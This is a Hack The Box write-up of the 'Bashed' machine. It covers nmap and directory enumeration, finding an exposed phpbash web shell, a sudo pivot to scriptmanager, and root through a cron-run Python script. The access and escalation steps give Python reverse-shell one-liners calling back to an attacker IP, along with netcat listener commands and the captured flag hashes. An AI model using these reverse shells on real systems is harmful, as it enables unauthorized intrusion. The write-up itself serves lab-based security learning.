+++
title = "HTB - Bashed"
date = 2025-06-14
+++

<img alt="Image" async src="images/Bashed.png" width="800px"></img>

Bashed is an easy machine on the HTB platform. Attackers must utilize their knowledge of web enumeration, scripting, and processes/permissions to achieve root access. There is quite a bit to be gained from diving into this machine, so lets start with our nmap scan.

### Reconnaissance

```
┌──(root㉿kali)-[/home/li0t]
└─# nmap -sV -sC --open -p- 10.10.10.68
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 08:45 EDT
Nmap scan report for 10.10.10.68
Host is up (0.12s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.42 seconds

```

Simple scan here, as the only port available to is port `80`. At the time, I'd no familiarity with other batch scan tools like `autorecon` and `nmapAutomator`. However, luckily this was the intended vector for the machine. It is always important to thoroughly enumerate these scans for everything. Write down each open port and what services are running on them.

### Enumeration

Seeing as the website is the only vector we have access to, we can be confident and aggressive in our approach.

 <img alt="Image" async src="images/Screenshot 2024-09-06 at 8.51.26 AM.png" width="800px"></img> 

The landing page offers us some information about `phpbash` as a tool, and we can do our due diligence to find out that it's essentially a web shell. Given the name of this box, I'd assume we were looking for a way to access a session hidden away in the directories of the server. We can use a directory-busting tool to enumerate further and we can also do so recursively should we need to pry further. I want to note, I used the `subdomain` wordlist here, but the `dirbuster 2.3 Medium` works as well.

<img alt="Image" async src="images/Screenshot 2024-09-06 at 8.52.13 AM.png" width="800px"></img>

### Initial Access

It takes a while to know what to look for in terms of uncommon or vulnerable configurations in terms of web directories. There are some rabbit-holes indeed. Keep in mind, though, I've mentioned in another writeup that things like `/dev/` are always of interest, and that's exactly what we get here.

<img alt="Image" async src="images/Screenshot 2024-09-07 at 8.27.20 AM.png" width="800px"></img>

We can see two files, but we're only interested in the second as it provides us with the aforementioned web shell.

<img alt="Image" async src="images/Screenshot 2024-09-07 at 8.27.55 AM.png" width="800px"></img>

While it's great to get an initial foothold into the system, it's also important to acknowledge the limitations of an environment like this. We can query a bit with commands like `whoami` and `sysinfo`, but we'd like to get a stable shell with functionality as soon as we can. We can start our listener `rlwrap nc -nlvp 443` to have it catch our call-back shell. Which call-back you use is very preferential and takes trial and error, and in this case, a python script from
http://revshells.com did the trick.

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",4321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

<img alt="Image" async src="images/Screenshot 2024-09-14 at 11.23.21 AM.png" width="800px"></img>

Now that we've caught our shell, we can do ourselves a great favor by looking to sstabilize. We can check which python version is installed with `which python`. In this case, we've got `python` instead of `python3`:

`TARGET: python -c 'import pty; pty.spawn("/bin/bash")'`
`TARGET: BACKGROUND THE PROCESS WITH ^Z`
`HOST: stty raw -echo;fg`
`TARGET: export TERM="xterm"`

Now, we can `cd` our way around to find the flag, usually within a users `/Desktop` directory.

`USER: b400f51178e32772ec99c792dd8b3465`

### Privilege Escalation

In order to get a sense of what we've got access to and what we do not, `sudo -l` and `ps -aux` are critical.

<img alt="Image" async src="images/Screenshot 2024-09-14 at 11.34.28 AM.png" width="800px"></img>

Here, we can see that we've got unrestricted access to commands as scriptmanager. We'll need to switch users in order to make that happen. `sudo` has a tag where you care able to switch users with `-u`, and we can specify which user and the environment we need to be spawned in `/bin/bash`

`sudo -u scriptmanager /bin/bash`

Once switched over, we can mosey around looking for ways to move vertically. Given the name of our user, `scripts` is an interesting directory that requires a look.

<img alt="Image" async src="images/Screenshot 2024-09-14 at 11.43.24 AM.png" width="800px"></img>

We can see the test script `test.py`, and it looks like it's being called every few minutes or so. All it does is write "Testing 123" to a file called `test.txt`. We assume a cronjob is calling it, given the periodical nature of its function. We can overwrite the file with a call-back shell to another listener. `rlwrap nc -nlvp 4444`

Overwrite the function with the script:

```
echo -e "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")" > test.py
```

After a few minutes, we'll get a call-back on our listener

<img alt="Image" async src="images/Screenshot 2024-09-14 at 12.07.58 PM.png" width="800px"></img>

 `ROOT:9aeb0d2bbee15d2405ee1a0cd24a9a5b`

#linux #easy #manual 
